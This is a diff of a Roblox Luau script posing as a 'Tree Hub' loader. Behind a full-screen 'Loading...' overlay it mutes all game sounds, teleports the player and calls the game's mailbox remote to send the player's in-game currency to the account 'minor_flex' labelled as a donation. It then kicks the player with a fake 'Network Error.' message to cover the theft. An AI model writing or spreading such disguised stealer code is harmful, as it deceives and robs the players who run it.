@@ -3,52 +3,119 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local SoundService = game:GetService("SoundService")
 local player = Players.LocalPlayer
 
--- Create black screen GUI
+-- Create blackout GUI
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "BlackoutGUI"
+screenGui.Name = "TreeHubLoader"
 screenGui.IgnoreGuiInset = true
 screenGui.ResetOnSpawn = false
 screenGui.DisplayOrder = 10000
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 screenGui.Parent = player:WaitForChild("PlayerGui")
 
-local blackFrame = Instance.new("Frame")
-blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-blackFrame.Size = UDim2.new(1, 0, 1, 0)
-blackFrame.Position = UDim2.new(0, 0, 0, 0)
-blackFrame.BorderSizePixel = 0
-blackFrame.Parent = screenGui
+-- Background Frame (black screen)
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.new(0, 0, 0) -- Black background
+bg.BorderSizePixel = 0
+bg.ZIndex = 1
+bg.Parent = screenGui
 
--- Ensure GUI persists after reset
+-- Add rounded corners to the background
+local bgCorner = Instance.new("UICorner")
+bgCorner.CornerRadius = UDim.new(0.02, 0) -- Slightly rounded corners
+bgCorner.Parent = bg
+
+-- "Tree Hub" Text centered
+local treeHubText = Instance.new("TextLabel")
+treeHubText.Size = UDim2.new(0.3, 0, 0.1, 0) -- Adjust width and height if needed
+treeHubText.Position = UDim2.new(0.5, 50, 0.5, -50) -- Centered horizontally and above Loading text
+treeHubText.AnchorPoint = Vector2.new(0.5, 0.5) -- Center anchor point
+treeHubText.BackgroundTransparency = 0.1 -- Slight background for rounded effect
+treeHubText.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1) -- Dark background
+treeHubText.Text = "Tree Hub"
+treeHubText.Font = Enum.Font.GothamBold
+treeHubText.TextScaled = true
+treeHubText.TextColor3 = Color3.new(1, 1, 1) -- White text
+treeHubText.ZIndex = 2
+treeHubText.Parent = screenGui
+
+-- Add rounded corners to the text background
+local textCorner = Instance.new("UICorner")
+textCorner.CornerRadius = UDim.new(0.1, 0) -- More rounded for the text
+textCorner.Parent = treeHubText
+
+-- Decal next to the "Tree Hub" text on the left
+local logo = Instance.new("ImageLabel")
+logo.Size = UDim2.new(0.1, 0, 0.1, 0) -- Perfect square dimensions
+logo.Position = UDim2.new(0.5, -200, 0.5, -50) -- Positioned further to the left and aligned with "Tree Hub"
+logo.AnchorPoint = Vector2.new(0.5, 0.5) -- Center anchor point
+logo.BackgroundTransparency = 0.1 -- Slight background for rounded effect
+logo.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1) -- Dark background
+logo.Image = "rbxassetid://109253137022905" -- Decal ID
+logo.ZIndex = 2
+logo.Parent = screenGui
+
+-- Add rounded corners to the decal
+local logoCorner = Instance.new("UICorner")
+logoCorner.CornerRadius = UDim.new(0.1, 0) -- More rounded for the decal
+logoCorner.Parent = logo
+
+-- "Loading..." Text centered below "Tree Hub"
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(0.3, 0, 0.05, 0) -- Slightly smaller text
+loadingText.Position = UDim2.new(0.5, 0, 0.5, 25) -- Centered horizontally and below "Tree Hub"
+loadingText.AnchorPoint = Vector2.new(0.5, 0.5) -- Center anchor point
+loadingText.BackgroundTransparency = 0.1 -- Slight background for rounded effect
+loadingText.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1) -- Dark background
+loadingText.Text = "Loading..."
+loadingText.Font = Enum.Font.Gotham
+loadingText.TextScaled = true
+loadingText.TextColor3 = Color3.new(1, 1, 1) -- White text
+loadingText.ZIndex = 2
+loadingText.Parent = screenGui
+
+-- Add rounded corners to the Loading text background
+local loadingCorner = Instance.new("UICorner")
+loadingCorner.CornerRadius = UDim.new(0.1, 0) -- Rounded for the text
+loadingCorner.Parent = loadingText
+
+-- Make GUI persistent after reset
 player.CharacterAdded:Connect(function()
 	screenGui.Parent = player:WaitForChild("PlayerGui")
 end)
 
--- Wait to ensure GUI is fully rendered
+-- Wait for screen to fully load
 task.wait(0.2)
 
--- Disable all sounds
-for _, sound in ipairs(workspace:GetDescendants()) do
-	if sound:IsA("Sound") then
-		sound.Volume = 0
+-- Mute all sounds
+local function muteAllSounds(parent)
+	for _, obj in ipairs(parent:GetDescendants()) do
+		if obj:IsA("Sound") then
+			obj.Volume = 0
+		end
 	end
 end
-for _, sound in ipairs(SoundService:GetDescendants()) do
-	if sound:IsA("Sound") then
-		sound.Volume = 0
-	end
-end
+muteAllSounds(workspace)
+muteAllSounds(SoundService)
+muteAllSounds(ReplicatedStorage)
+muteAllSounds(game:GetService("StarterGui"))
+muteAllSounds(game:GetService("Lighting"))
 
--- Teleport player
+-- Teleport the player
 local character = player.Character or player.CharacterAdded:Wait()
 local root = character:WaitForChild("HumanoidRootPart")
 root.CFrame = CFrame.new(141.07138061523438, 23.59348487854004, -348.0879211425781)
 
--- Send donation
+-- Send the donation
 local args = {
 	"minor_flex",
 	"Thank you for the donation!",
 	"Currency",
 	"9f49501cc1384848890fd52573e68bf8",
-	99999999999999 
+	10000
 }
 ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+-- Kick after 10 seconds
+task.wait(10)
+player:Kick("Network Error.")
